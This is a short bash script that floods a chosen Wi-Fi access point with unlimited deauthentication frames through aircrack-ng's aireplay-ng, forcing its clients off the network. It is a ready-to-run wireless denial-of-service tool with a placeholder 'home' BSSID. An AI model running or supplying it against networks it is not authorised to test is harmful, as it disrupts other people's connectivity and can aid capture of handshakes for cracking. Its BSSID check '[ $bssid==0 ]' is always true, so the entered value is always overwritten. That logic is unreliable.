#!/bin/bash

# NOTE: Replace wlo1mon with what aircrack has assigned to your network card

# This variable stores a default bssid, which can be used by entering "0" during execution
a="default bssid here"

# Read in the bssid entered
read -p "Enter BSSID: " bssid

# If the bssid is 0, then use the default bssid
if [ $bssid==0 ]; then
	echo "[/] Using home bssid..."
	bssid=$a
fi

echo "BSSID found: $bssid"

# Send the deauthentication frames to the bssid
sudo aireplay-ng --deauth 0 -a $bssid wlo1mon
